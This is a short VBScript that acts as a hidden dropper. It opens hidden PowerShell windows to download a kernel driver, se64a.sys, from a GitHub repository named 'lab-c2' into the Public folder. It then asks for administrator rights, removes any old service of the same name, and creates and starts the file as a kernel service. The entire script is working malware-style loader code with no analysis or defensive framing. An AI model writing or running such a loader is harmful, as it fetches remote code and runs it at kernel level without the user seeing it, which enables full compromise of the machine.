Set objShell = CreateObject("WScript.Shell")
' Using Public folder to ensure the path is identical for all users
driverPath = "C:\Users\Public\se64a.sys"
githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/se64a.sys"

' 1. Download the driver to the Public folder
cmdDownload = "powershell -NoP -W Hidden -C ""Invoke-WebRequest -Uri '" & githubURL & "' -OutFile '" & driverPath & "'"""
objShell.Run cmdDownload, 0, True

' 2. Register and Start the service
' We use 'sc delete' first to clear the old broken service, then 'sc create'
cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete se64a & sc create se64a binPath= " & driverPath & " type= kernel && sc start se64a' -Verb RunAs"""
objShell.Run cmdLoad, 0, False
